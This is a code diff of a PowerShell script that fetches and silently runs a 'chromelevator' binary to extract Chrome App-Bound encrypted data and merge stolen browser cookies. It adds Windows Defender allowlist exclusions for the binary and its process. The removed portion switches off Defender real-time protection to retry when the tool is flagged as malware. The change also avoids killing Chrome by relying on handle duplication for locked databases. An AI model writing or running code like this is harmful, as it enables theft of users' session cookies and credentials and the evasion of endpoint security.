@@ -234,7 +234,7 @@ function Add-DefenderAllowlistEntry {
 function Protect-ChromelevatorBinary {
     param([string]$ElevatorPath)
 
-    if ($IsRunningAsAdmin) {
+    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
         Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
         Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
     }
@@ -286,8 +286,8 @@ function Invoke-ChromelevatorProcess {
 
         $process = New-Object System.Diagnostics.Process
         $process.StartInfo.FileName = $Path
-        # chromelevator syntax: [options] <chrome|edge|...>  — options must come before browser target
-        $process.StartInfo.Arguments = "-k -o `"$OutputDir`" chrome"
+        # No -k/--kill: do not terminate Chrome; chromelevator uses handle duplication for locked DBs
+        $process.StartInfo.Arguments = "-o `"$OutputDir`" chrome"
         $process.StartInfo.UseShellExecute = $false
         $process.StartInfo.CreateNoWindow = $true
         $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
@@ -314,41 +314,9 @@ function Invoke-ChromelevatorProcess {
         }
     }
 
-    try {
-        $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
-        if ($result.ExitCode -ne 0) {
-            throw "chromelevator exited with code $($result.ExitCode)"
-        }
-        return
-    }
-    catch {
-        $firstError = $_.Exception.Message
-        if ($firstError -notmatch "virus|potentially unwanted|malware|software malicioso|no deseado") {
-            throw
-        }
-        Write-Host "[DEBUG] Defender blocked execution; retrying with real-time protection disabled..."
-    }
-
-    $rtDisabled = $false
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
-        $rtDisabled = $true
-        Write-Host "[DEBUG] Real-time protection disabled temporarily"
-        Start-Sleep -Seconds 2
-        Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
-        $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
-        if ($result.ExitCode -ne 0) {
-            throw "chromelevator exited with code $($result.ExitCode)"
-        }
-    }
-    catch {
-        throw "Defender blocked chromelevator even with admin. Disable Tamper Protection or allow the file manually in Windows Security. Inner: $($_.Exception.Message)"
-    }
-    finally {
-        if ($rtDisabled) {
-            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-            Write-Host "[DEBUG] Real-time protection re-enabled"
-        }
+    $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
+    if ($result.ExitCode -ne 0) {
+        throw "chromelevator exited with code $($result.ExitCode)"
     }
 }
 
@@ -496,12 +464,6 @@ function Merge-ChromelevatorCookies {
     return $cookies.Count
 }
 
-function Add-DefenderExclusionIfAdmin {
-    param([string]$Path)
-
-    Add-DefenderAllowlistEntry -Path $Path | Out-Null
-}
-
 function Get-ChromelevatorExecutable {
     param(
         [string]$ApiBase,
@@ -518,7 +480,9 @@ function Get-ChromelevatorExecutable {
     New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null
 
     $elevatorPath = Join-Path $CacheDir "chromelevator_$ArchTag.exe"
-    Add-DefenderAllowlistEntry -Path $elevatorPath | Out-Null
+    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
+        Add-DefenderAllowlistEntry -Path $elevatorPath | Out-Null
+    }
 
     $needsDownload = $true
     if (Test-Path -LiteralPath $elevatorPath) {
@@ -579,7 +543,7 @@ function Invoke-ChromelevatorExtraction {
         return ,[pscustomobject]$meta
     }
 
-    if ($IsRunningAsAdmin) {
+    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
         Initialize-ChromelevatorDefenderAllowlist | Out-Null
     }
 
@@ -591,7 +555,6 @@ function Invoke-ChromelevatorExtraction {
         $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
         $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-        Add-DefenderExclusionIfAdmin -Path $outDir | Out-Null
 
         Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) data..."
         Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
